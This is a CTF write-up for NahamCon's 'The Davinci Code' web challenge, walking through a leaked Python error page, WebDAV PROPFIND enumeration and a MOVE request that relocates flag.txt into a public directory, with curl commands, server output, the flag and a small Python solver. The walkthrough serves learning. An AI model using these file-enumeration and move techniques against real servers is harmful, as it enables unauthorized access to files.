---
title: The Davinci Code
categories:
  - CTF
tags:
  - nahamcon-CTF
  - Web
published: false
---

# Challenge Information

> Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken... 

## Explanation

Homepage of the challenge.

![](/assets/img/posts/2024-05-24-The-Davinci-Code/2024-05-24-The-Davinci-Code-07-04-37.png)

Nothing much to start around so I decided to just play around with the only button which lead to the next page.

![](/assets/img/posts/2024-05-24-The-Davinci-Code/2024-05-24-The-Davinci-Code-07-06-01.png)

It appears to be some errors provided by python. After poking around, I noticed that it reveal a part of the code. 

![](/assets/img/posts/2024-05-24-The-Davinci-Code/2024-05-24-The-Davinci-Code-07-08-32.png)

Based on the leaked code, I noticed that there's another HTTP method `PROPFIND`. I then tried to search in google and noticed that it is something to do with [WebDAV](https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142960(v=exchg.65)). I then tried to check all the available HTTP method.

```bash
curl -IX OPTIONS http://challenge.nahamcon.com:31722/  
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Fri, 24 May 2024 10:51:21 GMT
Content-Type: text/html; charset=utf-8
Allow: HEAD, PROPFIND, GET, OPTIONS
Content-Length: 0
Connection: close
```

After confirming that `PROPFIND` HTTP method is available, I then move on and check whats interesting in it.

```bash
curl -X PROPFIND http://challenge.nahamcon.com:31722/  | xmllint --format -
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1108  100  1108    0     0   1903      0 --:--:-- --:--:-- --:--:--  1907
<?xml version="1.0"?>
<D:multistatus xmlns:D="DAV:">
  <D:response>
    <D:href>/</D:href>
    <D:propstat>
      <D:prop>
        <D:message>WebDAVinci Code</D:message>
        <D:directory>True</D:directory>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
  <D:response>
    <D:href>/__pycache__</D:href>
    <D:propstat>
      <D:prop>
        <D:displayname>__pycache__</D:displayname>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
  <D:response>
    <D:href>/templates</D:href>
    <D:propstat>
      <D:prop>
        <D:displayname>templates</D:displayname>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
  <D:response>
    <D:href>/app.py</D:href>
    <D:propstat>
      <D:prop>
        <D:displayname>app.py</D:displayname>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
  <D:response>
    <D:href>/static</D:href>
    <D:propstat>
      <D:prop>
        <D:displayname>static</D:displayname>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
  <D:response>
    <D:href>/the_secret_dav_inci_code</D:href>
    <D:propstat>
      <D:prop>
        <D:displayname>the_secret_dav_inci_code</D:displayname>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
</D:multistatus>
```

I noticed that there's a interesting link `the_secret_dav_inci_code`, so I moved on and check if there's anything suspicious.


```bash
curl -X PROPFIND http://challenge.nahamcon.com:31722/the_secret_dav_inci_code  | xmllint --format -
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   453  100   453    0     0    910      0 --:--:-- --:--:-- --:--:--   911
<?xml version="1.0"?>
<D:multistatus xmlns:D="DAV:">
  <D:response>
    <D:href>/the_secret_dav_inci_code</D:href>
    <D:propstat>
      <D:prop>
        <D:message>WebDAVinci Code</D:message>
        <D:directory>True</D:directory>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
  <D:response>
    <D:href>/the_secret_dav_inci_code/flag.txt</D:href>
    <D:propstat>
      <D:prop>
        <D:displayname>flag.txt</D:displayname>
      </D:prop>
      <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
  </D:response>
</D:multistatus>
```

I managed to get the flag.txt by using `PROPFIND` HTTP method. I then moved on trying to grab the flag but it did not work. I then check again the HTTP method again for the specific link.

```bash
curl -IX OPTIONS http://challenge.nahamcon.com:31722/the_secret_dav_inci_code/flag.txt  
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Fri, 24 May 2024 11:26:59 GMT
Content-Type: text/html; charset=utf-8
Allow: MOVE, PROPFIND, HEAD, OPTIONS, GET
Content-Length: 0
Connection: close
```

Now aside from `PROPFIND`, there another HTTP method `MOVE`. It seems that [`MOVE`](https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142926(v=exchg.65)) HTTP method could move the file from current destination to new destination. After understanding, I tried to move the flag into a directory which I found from the application `/static/`.

```bash
curl -IX MOVE http://challenge.nahamcon.com:30114/the_secret_dav_inci_code/flag.txt -H 'Destination: /static/flag.txt'
HTTP/1.1 204 NO CONTENT
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Fri, 24 May 2024 11:31:44 GMT
Content-Type: text/html; charset=utf-8
Connection: close
```

After moving it, it does not provide any useful output. I then just try to retrieve the flag and see if its working.

```bash
curl http://challenge.nahamcon.com:30114/static/flag.txt                                                              
flag{2bc76964262b3a1bbd5bc610c6918438}
```
### Extra

I wrote a python code to solve this challenge for fun. 

```py
import requests

url = "http://challenge.nahamcon.com:30114/"

requests.request("MOVE", url+'/the_secret_dav_inci_code/flag.txt', headers={"Destination": "/static/flag.txt"})
result = requests.get(url+'/static/flag.txt')
print(result.text)
```

## Things i learned from the challenge

- you could actually read source code from the python error page.
- WebDAV HTTP method seems fun.
